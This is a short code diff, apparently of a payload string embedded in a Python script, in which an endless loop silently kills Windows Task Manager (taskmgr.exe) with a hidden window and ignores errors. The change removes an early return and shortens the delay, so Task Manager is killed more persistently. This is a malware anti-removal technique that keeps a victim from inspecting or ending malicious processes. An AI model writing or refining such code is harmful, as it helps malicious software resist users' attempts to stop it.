@@ -19,9 +19,9 @@ while True:
 
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        return subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'], startupinfo=startupinfo).wait()
+        subprocess.Popen(['taskkill', '/F', '/IM', 'taskmgr.exe'], startupinfo=startupinfo).wait()
 
-        time.sleep(0.5)
+        time.sleep(0.3)
     except Exception:
         pass
 ''')
